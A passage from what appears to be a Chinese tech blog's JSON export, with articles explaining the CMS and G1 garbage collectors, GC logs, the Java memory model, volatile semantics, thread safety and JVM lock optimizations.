CMS收集器CMS（ConcurrentMarkSweep）收集器是一种以获取最短回收停顿时间为目标的收集器。目前很大一部分的Java应用都集中在互联网站或B/S系统的服务端上，这类应用尤其重视服务的响应速度，希望系统停顿时间最短，以给用户带来较好的体验。CMS收集器就非常符合这类应用的需求。从名字（包含“MarkSweep”）上就可以看出CMS收集器是基于“标记-清除”算法实现的，它的运作过程相对于前面几种收集器来说要更复杂一些，整个过程分如下步骤，包括： 阶段 说明 (1) 初始标记 (Initial Mark) (Stop the World Event,所有应用线程暂停) 在老年代(old generation)中的对象, 如果从年轻代(young generation)中能访问到, 则被 “标记,marked” 为可达的(reachable).对象在旧一代“标志”可以包括这些对象可能可以从年轻一代。暂停时间一般持续时间较短,相对小的收集暂停时间. (2) 并发标记 (Concurrent Marking) 在Java应用程序线程运行的同时遍历老年代(tenured generation)的可达对象图。扫描从被标记的对象开始,直到遍历完从root可达的所有对象. 调整器(mutators)在并发阶段的2、3、5阶段执行,在这些阶段中新分配的所有对象(包括被提升的对象)都立刻标记为存活状态. (3) 再次标记(Remark) (Stop the World Event, 所有应用线程暂停) 查找在并发标记阶段漏过的对象，这些对象是在并发收集器完成对象跟踪之后由应用线程更新的. (4) 并发清理(Concurrent Sweep) 回收在标记阶段(marking phases)确定为不可及的对象. 死对象的回收将此对象占用的空间增加到一个空闲列表(free list),供以后的分配使用。死对象的合并可能在此时发生. 请注意,存活的对象并没有被移动. (5) 重置(Resetting) 清理数据结构,为下一个并发收集做准备. 其中初始标记、重新标记这两个步骤仍然需要“StopTheWorld”。初始标记仅仅只是标记一下GCRoots能直接关联到的对象，速度很快，并发标记阶段就是进行GCRootsTracing的过程，而重新标记阶段则是为了修正并发标记期间，因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段稍长一些，但远比并发标记的时间短。由于整个过程中耗时最长的并发标记和并发清除过程中，收集器线程都可以与用户线程一起工作，所以总体上来说，CMS收集器的内存回收过程是与用户线程一起并发地执行的。ConcurrentMarkSweep收集器运行示意图： CMS是一款优秀的收集器，它的最主要优点在名字上已经体现出来了：并发收集、低停顿，Sun的一些官方文档里面也称之为并发低停顿收集器（ConcurrentLowPauseCollector）。但是CMS还远达不到完美的程度，它有以下三个显著的缺点： CMS收集器对CPU资源非常敏感。其实，面向并发设计的程序都对CPU资源比较敏感。在并发阶段，它虽然不会导致用户线程停顿，但是会因为占用了一部分线程（或者说CPU资源）而导致应用程序变慢，总吞吐量会降低。CMS默认启动的回收线程数是（CPU数量+3）/4，也就是当CPU在4个以上时，并发回收时垃圾收集线程最多占用不超过25%的CPU资源。但是当CPU不足4个时（譬如2个），那么CMS对用户程序的影响就可能变得很大，如果CPU负载本来就比较大的时候，还分出一半的运算能力去执行收集器线程，就可能导致用户程序的执行速度忽然降低了50%，这也很让人受不了。为了解决这种情况，虚拟机提供了一种称为“增量式并发收集器”（IncrementalConcurrentMarkSweep/i-CMS）的CMS收集器变种，所做的事情和单CPU年代PC机操作系统使用抢占式来模拟多任务机制的思想一样，就是在并发标记和并发清理的时候让GC线程、用户线程交替运行，尽量减少GC线程的独占资源的时间，这样整个垃圾收集的过程会更长，但对用户程序的影响就会显得少一些，速度下降也就没有那么明显，但是目前版本中，i-CMS已经被声明为“deprecated”，即不再提倡用户使用。 CMS收集器无法处理浮动垃圾（FloatingGarbage），可能出现“ConcurrentModeFailure”失败而导致另一次FullGC的产生。由于CMS并发清理阶段用户线程还在运行着，伴随程序的运行自然还会有新的垃圾不断产生，这一部分垃圾出现在标记过程之后，CMS无法在本次收集中处理掉它们，只好留待下一次GC时再将其清理掉。这一部分垃圾就称为“浮动垃圾”。也是由于在垃圾收集阶段用户线程还需要运行，即还需要预留足够的内存空间给用户线程使用，因此CMS收集器不能像其他收集器那样等到老年代几乎完全被填满了再进行收集，需要预留一部分空间提供并发收集时的程序运作使用。在默认设置下，CMS收集器在老年代使用了68%的空间后就会被激活，这是一个偏保守的设置，如果在应用中老年代增长不是太快，可以适当调高参数-XX：CMSInitiatingOccupancyFraction的值来提高触发百分比，以便降低内存回收次数以获取更好的性能。要是CMS运行期间预留的内存无法满足程序需要，就会出现一次“ConcurrentModeFailure”失败，这时候虚拟机将启动后备预案：临时启用SerialOld收集器来重新进行老年代的垃圾收集，这样停顿时间就很长了。所以说参数-XX：CMSInitiatingOccupancyFraction设置得太高将会很容易导致大量“ConcurrentModeFailure”失败，性能反而降低。 还有最后一个缺点，在本节在开头说过，CMS是一款基于“标记-清除”算法实现的收集器，如果读者对前面这种算法介绍还有印象的话，就可能想到这意味着收集结束时会产生大量空间碎片。空间碎片过多时，将会给大对象分配带来很大的麻烦，往往会出现老年代还有很大的空间剩余，但是无法找到足够大的连续空间来分配当前对象，不得不提前触发一次FullGC。为了解决这个问题，CMS收集器提供了一个-XX：+UseCMSCompactAtFullCollection开关参数，用于在“享受”完FullGC服务之后额外免费附送一个碎片整理过程，内存整理的过程是无法并发的。空间碎片问题没有了，但停顿时间不得不变长了。虚拟机设计者们还提供了另外一个参数-XX：CMSFullGCsBeforeCompaction，这个参数用于设置在执行多少次不压缩的FullGC后，跟着来一次带压缩的。后续分开介绍： 3.2.7.G1收集器G1（GarbageFirst）收集器G1 GC 是 Jdk7 的新特性之一、Jdk7+版本都可以自主配置 G1 作为 JVM GC 选项；作为 JVM GC 算法的一次重大升级、DK7u 后 G1 已相对稳定、且未来计划替代 CMS、所以有必要深入了解下： 不同于其他的分代回收算法、G1 将堆空间划分成了互相独立的区块。每块区域既有可能属于 O 区、也有可能是 Y 区，且每类区域空间可以是不连续的（对比 CMS 的 O 区和 Y 区都必须是连续的）。这种将 O 区划分成多块的理念源于：当并发后台线程寻找可回收的对象时、有些区块包含可回收的对象要比其他区块多很多。虽然在清理这些区块时 G1 仍然需要暂停应用线程、但可以用相对较少的时间优先回收包含垃圾最多区块。如下： 这也是为什么G1命名为Garbage First的原因：第一时间处理垃圾最多的区块。平时工作中大多数系统都使用CMS、即使静默升级到JDK7默认仍然采用CMS、那么G1相对于CMS的区别在： G1 在压缩空间方面有优势G1 通过将内存空间分成区域（Region）的方式避免内存碎片问题Eden, Survivor, Old 区不再固定、在内存使用效率上来说更灵活G1 可以通过设置预期停顿时间（Pause Time）来控制垃圾收集时间避免应用雪崩现象G1 在回收内存后会马上同时做合并空闲内存的工作、而 CMS 默认是在 STW（stop the world）的时候做G1 会在 Young GC 中使用、而 CMS 只能在 O 区使用就目前而言、CMS 还是默认首选的 GC 策略、可能在以下场景下 G1 更适合： 服务端多核 CPU、JVM 内存占用较大的应用（至少大于 4G）应用在运行过程中会产生大量内存碎片、需要经常压缩空间想要更可控、可预期的 GC 停顿周期；防止高并发下应用雪崩现象一次完整 G1GC 的详细过程： G1 在运行过程中主要包含如下 4 种操作方式： YGC（不同于 CMS）并发阶段混合模式full GC （一般是 G1 出现问题时发生）YGC： 下面是一次 YGC 前后内存区域是示意图： 图中每个小区块都代表 G1 的一个区域（Region），区块里面的字母代表不同的分代内存空间类型（如[E]Eden,[O]Old,[S]Survivor）空白的区块不属于任何一个分区；G1 可以在需要的时候任意指定这个区域属于 Eden 或是 O 区之类的。G1 YoungGC 在 Eden 充满时触发，在回收之后所有之前属于 Eden 的区块全变成空白。然后至少有一个区块是属于 S 区的（如图半满的那个区域），同时可能有一些数据移到了 O 区。 目前淘系的应用大都使用 PrintGCDetails 参数打出 GC 日志、这个参数对 G1 同样有效、但日志内容颇为不同；下面是一个 Young GC 的例子： 123423.430: [GC pause (young), 0.23094400 secs]...[Eden: 1286M(1286M)-&gt;0B(1212M)Survivors: 78M-&gt;152M Heap: 1454M(4096M)-&gt;242M(4096M)][times: user=0.85 sys=0.05, real=0.23 secs] 上面日志的内容解析：Young GC 实际占用 230 毫秒、其中 GC 线程占用 850 毫秒的 CPU 时间E：内存占用从 1286MB 变成 0、都被移出S：从 78M 增长到了 152M、说明从 Eden 移过来 74MHeap:占用从 1454 变成 242M、说明这次 Young GC 一共释放了 1212M 内存空间很多情况下，S 区的对象会有部分晋升到 Old 区，另外如果 S 区已满、Eden 存活的对象会直接晋升到 Old 区，这种情况下 Old 的空间就会涨 并发阶段： 一个并发 G1 回收周期前后内存占用情况如下图所示： 从上面的图表可以看出以下几点：1、Young区发生了变化、这意味着在G1并发阶段内至少发生了一次YGC（这点和CMS就有区别），Eden在标记之前已经被完全清空，因为在并发阶段应用线程同时在工作、所以可以看到Eden又有新的占用2、一些区域被X标记，这些区域属于O区，此时仍然有数据存放、不同之处在G1已标记出这些区域包含的垃圾最多、也就是回收收益最高的区域3、在并发阶段完成之后实际上O区的容量变得更大了（O+X的方块）。这时因为这个过程中发生了YGC有新的对象进入所致。此外，这个阶段在O区没有回收任何对象：它的作用主要是标记出垃圾最多的区块出来。对象实际上是在后面的阶段真正开始被回收 G1 并发标记周期可以分成几个阶段、其中有些需要暂停应用线程。第一个阶段是初始标记阶段。这个阶段会暂停所有应用线程-部分原因是这个过程会执行一次 YGC、下面是一个日志示例： 50.541: [GC pause (young) (initial-mark), 0.27767100 secs][eden: 1220m(1220m)-&gt;0b(1220m) survivors: 144m-&gt;144m heap: 3242m(4096m)-&gt;2093m(4096m)] [Times: user=1.02 sys=0.04, real=0.28 secs] 上面的日志表明发生了 YGC、应用线程为此暂停了 280 毫秒，Eden 区被清空（71MB 从 Young 区移到了 O 区）。日志里面 initial-mark 的字样表明后台的并发 GC 阶段开始了。因为初始标记阶段本身也是要暂停应用线程的，G1 正好在 YGC 的过程中把这个事情也一起干了。为此带来的额外开销不是很大、增加了 20%的 CPU，暂停时间相应的略微变长了些。 接下来，G1 开始扫描根区域、日志示例： 1250.819: [GC concurrent-root-region-scan-start]51.408: [GC concurrent-root-region-scan-end, 0.5890230] 一共花了 580 毫秒，这个过程没有暂停应用线程；是后台线程并行处理的。这个阶段不能被 YGC 所打断、因此后台线程有足够的 CPU 时间很关键。如果 Young 区空间恰好在 Root 扫描的时候满了、YGC 必须等待 root 扫描之后才能进行。带来的影响是 YGC 暂停时间会相应的增加。这时的 GC 日志是这样的： 123&gt; 350.994: [GC pause (young)&gt; 351.093: [GC concurrent-root-region-scan-end, 0.6100090]&gt; 351.093: [GC concurrent-mark-start],0.37559600 secs] GC 暂停这里可以看出在 root 扫描结束之前就发生了，表明 YGC 发生了等待，等待时间大概是 100 毫秒。在 root 扫描完成后，G1 进入了一个并发标记阶段。这个阶段也是完全后台进行的；GC 日志里面下面的信息代表这个阶段的开始和结束： 12111.382: [GC concurrent-mark-start] ....120.905: [GC concurrent-mark-end, 9.5225160 sec] 并发标记阶段是可以被打断的，比如这个过程中发生了 YGC 就会。这个阶段之后会有一个二次标记阶段和清理阶段： 12&gt; 120.910: [GC remark 120.959: [GC ref-PRC, 0.0000890 secs], 0.0718990 secs][times: user=0.23 sys=0.01, real=0.08 secs]&gt; 120.985: [GC cleanup 3510M-&gt;3434M(4096M), 0.0111040 secs][times: user=0.04 sys=0.00, real=0.01 secs] 这两个阶段同样会暂停应用线程，但时间很短。接下来还有额外的一次并发清理阶段： 12120.996: [GC concurrent-cleanup-start]120.996: [GC concurrent-cleanup-end, 0.0004520] 到此为止，正常的一个 G1 周期已完成–这个周期主要做的是发现哪些区域包含可回收的垃圾最多（标记为 X），实际空间释放较少。 混合 GC： 接下来 G1 执行一系列的混合 GC。这个时期因为会同时进行 YGC 和清理上面已标记为 X 的区域，所以称之为混合阶段，下面是一个混合 GC 执行的前后示意图： 像普通的YGC那样、G1完全清空掉Eden同时调整survivor区。另外，两个标记也被回收了，他们有个共同的特点是包含最多可回收的对象，因此这两个区域绝对部分空间都被释放了。这两个区域任何存活的对象都被移到了其他区域（和YGC存活对象晋升到O区类似）。这就是为什么G1的堆比CMS内存碎片要少很多的原因–移动这些对象的同时也就是在压缩对内存。下面是一个混合GC的日志： 79.826: [GC pause (mixed), 0.26161600 secs] …. [Eden: 1222M(1222M)-&gt;0B(1220M) Survivors: 142M-&gt;144M Heap:3200M(4096M)-&gt;1964M(4096M)][times: user=1.01 sys=0.00, real=0.26 secs]上面的日志可以注意到 Eden 释放了 1222MB、但整个堆的空间释放内存要大于这个数目。数量相差看起来比较少、只有 16MB，但是要考虑同时有 survivor 区的对象晋升到 O 区；另外，每次混合 GC 只是清理一部分的 O 区内存，整个 GC 会一直持续到几乎所有的标记区域垃圾对象都被回收，这个阶段完了之后 G1 会重新回到正常的 YGC 阶段。周期性的，当 O 区内存占用达到一定数量之后 G1 又会开启一次新的并行 GC 阶段.后续分开介绍：。。 参考深入理解 java 虚拟机http://ifeve.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3g1%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8/","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://wuhaocn.github.io/tags/JVM/"}]},{"title":"JVM内存与线程","slug":"language/jvm/JVM内存与线程","date":"2021-08-04T06:25:13.661Z","updated":"2021-08-04T06:25:13.661Z","comments":true,"path":"2021/08/04/language/jvm/JVM内存与线程/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/jvm/JVM%E5%86%85%E5%AD%98%E4%B8%8E%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"1 内存1.1 内存一致性由于计算机的存储设备与处理器的运算速度之间有着几个数量级的差距，所以现代计算机系统都不得不加入一层读写速度尽可能接近处理器运算速度的高速缓存（Cache）来作为内存与处理器之间的缓冲：将运算需要使用到的数据复制到缓存中，让运算能快速进行，当运算结束后再从缓存同步回内存之中，这样处理器就无须等待缓慢的内存读写了。基于高速缓存的存储交互很好地解决了处理器与内存的速度矛盾，但是也引入了新的问题：缓存一致性（CacheCoherence）。在多处理器系统中，每个处理器都有自己的高速缓存，而它们又共享同一主内存（MainMemory），如图所示： 当多个处理器的运算任务都涉及同一块主内存区域时，将可能导致各自的缓存数据不一致的情况，如果真的发生这种情况，那同步回到主内存时以谁的缓存数据为准呢？为了解决一致性的问题，需要各个处理器访问缓存时都遵循一些协议，在读写时要根据协议来进行操作，这类协议有 MSI、MESI（IllinoisProtocol）、MOSI、Synapse、Firefly 及 DragonProtocol，等等。 1.2 主内存与工作内存Java 内存模型的主要目标是定义程序各个变量的访问规则，即在虚拟机机中将变量存储到内存和从内存中取出变量这样的底层细节。此处的变量（Variable）与 Java 编程中所说的变量略有区别，它包括了实例字段、静态字段和构成数组对象的元素，但是不包括局部变量与方法参数，因为后者是线程私有的[3]，不会被共享，自然就不存在竞争问题。为了获得较好的执行效能，Java 内存模型并没有限制执行引擎使用处理器的特定寄存器或缓存来和主内存进行交互，也没有限制即时编译器调整代码执行顺序这类权利，线程对变量的操作都必须在工作内存中进行，而不能直接读写主内存，线程间无法直接访问对方工作内存的中变量，线程间变量值得传递均需要通过主内存来完成。如图所示： 1.3 内存间的交互操作关于主内存与工作内存之间的具体交互协议，即一个变量如何从主内存拷贝到工作内存、如何从工作内存同步到主内存之间的实现细节，Java 内存模型定义了以下八种操作来完成： lock（锁定）：作用于主内存的变量，把一个变量标识为一条线程独占状态。 unlock（解锁）：作用于主内存变量，把一个处于锁定状态的变量释放出来，释放后的变量才可以被其他线程锁定。 read（读取）：作用于主内存变量，把一个变量值从主内存传输到线程的工作内存中，以便随后的 load 动作使用 load（载入）：作用于工作内存的变量，它把 read 操作从主内存中得到的变量值放入工作内存的变量副本中。 use（使用）：作用于工作内存的变量，把工作内存中的一个变量值传递给执行引擎，每当虚拟机遇到一个需要使用变量的值的字节码指令时将会执行这个操作。 assign（赋值）：作用于工作内存的变量，它把一个从执行引擎接收到的值赋值给工作内存的变量，每当虚拟机遇到一个给变量赋值的字节码指令时执行这个操作。 store（存储）：作用于工作内存的变量，把工作内存中的一个变量的值传送到主内存中，以便随后的 write 的操作。 write（写入）：作用于主内存的变量，它把 store 操作从工作内存中一个变量的值传送到主内存的变量中。 如果要把一个变量从主内存中复制到工作内存，就需要按顺寻地执行 read 和 load 操作， 如果把变量从工作内存中同步回主内存中，就要按顺序地执行 store 和 write 操作。Java 内存 模型只要求上述操作必须按顺序执行，而没有保证必须是连续执行。也就是 read 和 load 之间， store 和 write 之间是可以插入其他指令的，如对主内存中的变量 a、b 进行访问时，可能的顺 序是 read a，read b，load b， load a。 Java 内存模型还规定了在执行上述八种基本操作时，必须满足如下规则： 不允许 read 和 load、store 和 write 操作之一单独出现 不允许一个线程丢弃它的最近 assign 的操作，即变量在工作内存中改变了之后必须同步到主内存中。 不允许一个线程无原因地（没有发生过任何 assign 操作）把数据从工作内存同步回主内存中。 一个新的变量只能在主内存中诞生，不允许在工作内存中直接使用一个未被初始化（load 或 assign）的变量。即就是对一个变量实施 use 和 store 操作之前，必须先执行过了 assign 和 load 操作。 一个变量在同一时刻只允许一条线程对其进行 lock 操作，但 lock 操作可以被同一条线程重复执行多次，多次执行 lock 后，只有执行相同次数的 unlock 操作，变量才会被解锁。lock 和 unlock 必须成对出现 如果对一个变量执行 lock 操作，将会清空工作内存中此变量的值，在执行引擎使用这个变量前需要重新执行 load 或 assign 操作初始化变量的值 如果一个变量事先没有被 lock 操作锁定，则不允许对它执行 unlock 操作；也不允许去 unlock 一个被其他线程锁定的变量。 对一个变量执行 unlock 操作之前，必须先把此变量同步到主内存中（执行 store 和 write 操作）。 1.4 重排序在执行程序时为了提高性能，编译器和处理器经常会对指令进行重排序。重排序分成三种类型： 1.编译器优化的重排序。编译器在不改变单线程程序语义放入前提下，可以重新安排语句的执行顺序。 2.指令级并行的重排序。现代处理器采用了指令级并行技术来将多条指令重叠执行。如果不存在数据依赖性，处理器可以改变语句对应机器指令的执行顺序。 3.内存系统的重排序。由于处理器使用缓存和读写缓冲区，这使得加载和存储操作看上去可能是在乱序执行。 从 Java 源代码到最终实际执行的指令序列，会经过下面三种重排序： 为了保证内存的可见性，Java 编译器在生成指令序列的适当位置会插入内存屏障指令来禁止特定类型的处理器重排序。Java 内存模型把内存屏障分为 LoadLoad、LoadStore、StoreLoad 和 StoreStore 四种： 1.5 volatile 型变量当一个变量定义为 volatile 之后，它将具备两种特性： 第一：保证此变量对所有线程的可见性，这里的可见性是指当一条线程修改了这个变量的值，新值对于其他线程来说是可以立即得知的。普通变量的值在线程间传递需要通过主内存来完成 由于 valatile 只能保证可见性，在不符合一下两条规则的运算场景中，我们仍要通过加锁来保证原子性 1.运算结果并不依赖变量的当前值，或者能够确保只有单一的线程修改变量的值。 2.变量不需要与其他的状态变量共同参与不变约束 第二：禁止指令重排序，普通的变量仅仅会保证在该方法的执行过程中所有依赖赋值结果的地方都能获取到正确的结果，而不能保证变量赋值操作的顺序与程序代码中执行顺序一致，这个就是所谓的线程内表现为串行的语义 Java 内存模型中对 volatile 变量定义的特殊规则。假定 T 表示一个线程，V 和 W 分别表示两个 volatile 变量，那么在进行 read、load、use、assign、store、write 操作时需要满足如下的规则： 1.只有当线程 T 对变量 V 执行的前一个动作是 load 的时候，线程 T 才能对变量 V 执行 use 动作；并且，只有当线程 T 对变量 V 执行的后一个动作是 use 的时候，线程 T 才能对变量 V 执行 load 操作。线程 T 对变量 V 的 use 操作可以认为是与线程 T 对变量 V 的 load 和 read 操作相关联的，必须一起连续出现。这条规则要求在工作内存中，每次使用变量 V 之前都必须先从主内存刷新最新值，用于保证能看到其它线程对变量 V 所作的修改后的值。 2.只有当线程 T 对变量 V 执行的前一个动是 assign 的时候，线程 T 才能对变量 V 执行 store 操作；并且，只有当线程 T 对变量 V 执行的后一个动作是 store 操作的时候，线程 T 才能对变量 V 执行 assign 操作。线程 T 对变量 V 的 assign 操作可以认为是与线程 T 对变量 V 的 store 和 write 操作相关联的，必须一起连续出现。这一条规则要求在工作内存中，每次修改 V 后都必须立即同步回主内存中，用于保证其它线程可以看到自己对变量 V 的修改。 3.假定操作 A 是线程 T 对变量 V 实施的 use 或 assign 动作，假定操作 F 是操作 A 相关联的 load 或 store 操作，假定操作 P 是与操作 F 相应的对变量 V 的 read 或 write 操作；类型地，假定动作 B 是线程 T 对变量 W 实施的 use 或 assign 动作，假定操作 G 是操作 B 相关联的 load 或 store 操作，假定操作 Q 是与操作 G 相应的对变量 V 的 read 或 write 操作。如果 A 先于 B，那么 P 先于 Q。这条规则要求 valitile 修改的变量不会被指令重排序优化，保证代码的执行顺序与程序的顺序相同。 1.6 对于 long 和 double 型变量的特殊规则Java 模型要求 lock、unlock、read、load、assign、use、store、write 这 8 个操作都具有原子性，但是对于 64 为的数据类型（long 和 double），在模型中特别定义了一条相对宽松的规定：允许虚拟机将没有被 volatile 修饰的 64 位数据的读写操作分为两次 32 为的操作来进行，即允许虚拟机实现选择可以不保证 64 位数据类型的 load、store、read 和 write 这 4 个操作的原子性 1.7 原子性、可见性和有序性原子性：即一个操作或者多个操作 要么全部执行并且执行的过程不会被任何因素打断，要么就都不执行。Java 内存模型是通过在变量修改后将新值同步会主内存，在变量读取前从主内存刷新变量值这种依赖主内存作为传递媒介的方式来实现可见性，valatile 特殊规则保障新值可以立即同步到祝内存中。Synchronized 是在对一个变量执行 unlock 之前，必须把变量同步回主内存中（执行 store、write 操作）。被 final 修饰的字段在构造器中一旦初始化完成，并且构造器没有吧 this 的引用传递出去，那在其他线程中就能看见 final 字段的值 可见性：可见性是指当多个线程访问同一个变量时，一个线程修改了这个变量的值，其他线程能够立即看得到修改的值。 有序性：即程序执行的顺序按照代码的先后顺序执行。 1.8 先行发生原则这些先行发生关系无须任何同步就已经存在，如果不再此列就不能保障顺序性，虚拟机就可以对它们任意地进行重排序 1.程序次序规则：在一个线程内，按照程序代码顺序，书写在前面的操作先行发生于书写在后面的操作。准确的说，应该是控制顺序而不是程序代码顺序，因为要考虑分支。循环等结构 2.管程锁定规则：一个 unlock 操作先行发生于后面对同一个锁的 lock 操作。这里必须强调的是同一个锁，而后面的是指时间上的先后顺序 3.Volatile 变量规则：对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作，这里的后面同样是指时间上的先后顺序 4.线程启动规则：Thread 对象的 start()方法先行发生于此线程的每一个动作 5.线程终止规则：线程中的所有操作都先行发生于对此线程的终止检测，我们可以通过 Thread.joke()方法结束、ThradisAlive()的返回值等手段检测到线程已经终止执行 6.线程中断规则：对线程 interrupt()方法的调用先行发生于被中断线程的代码检测到中断时间的发生，可以通过 Thread.interrupted()方法检测到是否有中断发生 7.对象终结规则：一个对象的初始化完成(构造函数执行结束)先行发生于它的 finalize()方法的开始 8.传递性：如果操作 A 先行发生于操作 B，操作 B 先行发生于操作 C，那就可以得出操作 A 先行发生于操作 C 的结论 2 Java 线程协同式调度：线程的执行时间由线程本身控制 抢占式调度：线程的执行时间由系统来分配 2.1 状态转换1.新建 2.运行：可能正在执行。可能正在等待 CPU 为它分配执行时间 3.无限期等待：不会被分配 CUP 执行时间，它们要等待被其他线程显式唤醒 4.限期等待：不会被分配 CUP 执行时间，它们无须等待被其他线程显式唤醒，一定时间会由系统自动唤醒 5.阻塞：阻塞状态在等待这获取到一个排他锁，这个时间将在另一个线程放弃这个锁的时候发生；等待状态就是在等待一段时间，或者唤醒动作的发生 6.结束：已终止线程的线程状态，线程已经结束执行 2.2 线程安全1、不可变：不可变的对象一定是线程安全的、无论是对象的方法实现还是方法的调用者，都不需要再采取任何的线程安全保障。例如：把对象中带有状态的变量都声明为 final，这样在构造函数结束之后，它就是不可变的。 2、绝对线程安全 3、相对线程安全：相对的线程安全就是我们通常意义上所讲的线程安全，它需要保证对这个对象单独的操作是线程安全的，我们在调用的时候不需要做额外的保障措施，但是对于一些特定顺序的连续调用，就可能需要在调用端使用额外的同步手段来保证调用的正确性 4、线程兼容：对象本身并不是线程安全的，但是可以通过在调用端正确地使用同步手段来保证对象在并发环境中可以安全使用 5、线程对立：是指无论调用端是否采取了同步措施，都无法在多线程环境中并发使用的代码 2.3 线程安全的实现方法1.互斥同步： 同步是指在多个线程并发访问共享数据时，保证共享数据在同一个时刻只被一个（或者是一些，使用信号量的时候）线程使用。而互斥是实现同步的一种手段，临界区、互斥量和信号量都是主要的互斥实现方式。互斥是因，同步是果：互斥是方法，同步是目的 在 Java 中，最基本的互斥同步手段就是 synchronized 关键字，它经过编译之后，会在同步块的前后分别形成 monitorenter 和 monitorexit 这两个字节码指令，这两个字节码都需要一个 reference 类型的参数来指明要锁定和解锁的对象。如果 Java 程序中的 synchronized 明确指定了对象参数，那就是这个对象的 reference；如果没有指明，那就根据 synchronized 修饰的是实例方法还是类方法，去取对应的对象实例或 Class 对象来作为锁对象。在执行 monitorenter 指令时，首先要尝试获取对象的锁。如果这个对象没有被锁定，或者当前线程已经拥有了那个对象的锁，把锁的计数器加 1，对应的在执行 monitorexit 指令时会将锁计数器减 1，当计数器为 0 时，锁就被释放。如果获取对象锁失败，哪当前线程就要阻塞等待，直到对象锁被另外一个线程释放为止 Synchronized，ReentrantLock 增加了一些高级功能 1.等待可中断：是指当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情，可中断特性对处理执行时间非常长的同步块很有帮助 2.公平锁：是指多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁；非公平锁则不能保证这一点，在锁被释放时，任何一个等待锁的线程都有机会获得锁。Synchronized 中的锁是非公平的，ReentrantLock 默认情况下也是非公平的，但可以通过带布尔值的构造函数要求使用公平锁 3.锁绑定多个条件是指一个 ReentrantLock 对象可以同时绑定多个 Condition 对象，而在 synchronized 中，锁对象的 wait()和 notify()或 notifyAll()方法可以实现一个隐含的条件，如果要和多余一个的条件关联的时候，就不得不额外地添加一个锁，而 ReentrantLock 则无须这样做，只需要多次调用 newCondition 方法即可 2.非阻塞同步 3.无同步方案 可重入代码：也叫纯代码，可以在代码执行的任何时刻中断它，转而去执行另外一段代码（包括递归调用它本身）而在控制权返回后，原来的程序不会出现任何错误。所有的可重入代码都是线程安全的，但是并非所有的线程安全的代码都是可重入的。 判断一个代码是否具备可重入性：如果一个方法，它的返回结果是可预测的，只要输入了相同的数据，就都能返回相同的结果，那它就满足可重入性的要求，当然也就是线程安全的 线程本地存储：如果一段代码中所需要的数据必须与其他代码共享，那就看看这些共享数据的代码是否能保证在同一个线程中执行？如果能保障，我们就可以把共享数据的可见范围限制在同一个线程之内，这样，无须同步也能保证线程之间不出现数据争用的问题 2.4 锁优化适应性自旋、锁消除、锁粗化、轻量级锁和偏向锁 2.4.1 自旋锁与自适应自旋自旋锁：如果物理机器上有一个以上的处理器，能让两个或以上的线程同时并行执行，我们就可以让后面请求锁的那个线程稍等一下，但不放弃处理器的执行时间，看看持有锁的线程是否很快就会释放锁。为了让线程等待，我们只需让线程执行一个忙循环（自旋），这项技术就是所谓的自旋锁 自适应自旋转：是由前一次在同一个锁对象上，自旋等待刚刚成功获得过锁，并且持有锁的线程正在运行中，那么虚拟机就会认为这次自旋也很有可能再次成功，进而它将允许自旋等待持续相对更长的时间。如果对于某个锁，自旋很少成功获得过，那在以后要获取这个锁时将可能省略掉自过程，以避免浪费处理器资源。 2.4.2 锁消除锁消除是指虚拟机即时编辑器在运行时，对一些代码上要求同步，但是被检测到不可能存在共享数据竞争的锁进行消除。如果在一段代码中。推上的所有数据都不会逃逸出去从而被其他线程访问到，那就可以把它们当作栈上数据对待，认为它们是线程私有的，同步加锁自然就无须进行 2.4.3 锁粗化如果虚拟机检测到有一串零碎的操作都是对同一对象的加锁，将会把加锁同步的范围扩展（粗化）到整个操作序列的外部 2.4.4 轻量级锁2.4.5 偏向锁它的目的是消除无竞争情况下的同步原语，进一步提高程序的运行性能。如果轻量级锁是在无竞争的情况下使用 CAS 操作去消除同步使用的互斥量，那偏向锁就是在无竞争的情况下把这个同步都消除掉，CAS 操作都不做了 如果在接下俩的执行过程中，该锁没有被其他线程获取，则持有偏向锁的线程将永远不需要在进行同步 3 逃逸分析逃逸分析的基本行为就是分析对象动态作用域：当一个对象在方法中被定义后，它可能被外部方法所引用，例如作为调用参数传递到其他方法中，成为方法逃逸。甚至还可能被外部线程访问到，比如赋值给类变量或可以在其他线程中访问的实例变量，称为线程逃逸 如果一个对象不会逃逸到方法或线程之外，也就是别的方法或线程无法通过任何途径访问到这个对象，则可能为这个变量进行一些高效的优化 栈上分配：如果确定一个对象不会逃逸出方法外，那让这个对象在栈上分配内存将会是一个不错的注意，对象所占用的内存空间就可以随栈帧出栈而销毁。如果能使用栈上分配，那大量的对象就随着方法的结束而销毁了，垃圾收集系统的压力将会小很多 同步消除：如果确定一个变量不会逃逸出线程，无法被其他线程访问，那这个变量的读写肯定就不会有竞争，对这个变量实施的同步措施也就可以消除掉 标量替换：标量就是指一个数据无法在分解成更小的数据表示了，int、long 等及 refrence 类型等都不能在进一步分解，它们称为标量。 如果一个数据可以继续分解，就称为聚合量，Java 中的对象就是最典型的聚合量 如果一个对象不会被外部访问，并且这个对象可以被拆散的化，那程序正整执行的时候将可能不创建这个对象，而改为直接创建它的若干个被这个方法使用到的成员变量来代替","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://wuhaocn.github.io/tags/JVM/"}]},{"title":"JVM优秀文章","slug":"language/jvm/JVM优秀文章","date":"2021-08-04T06:25:13.659Z","updated":"2021-08-04T06:25:13.661Z","comments":true,"path":"2021/08/04/language/jvm/JVM优秀文章/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/jvm/JVM%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0/","excerpt":"","text":"JVM G1 算法系列 G1 垃圾收集器介绍 G1 垃圾收集器之 RSet G1 垃圾收集器之 SATB G1 垃圾收集器之对象分配过程 ZGC 系列 ZGC，一个超乎想象的垃圾收集器 ZGC 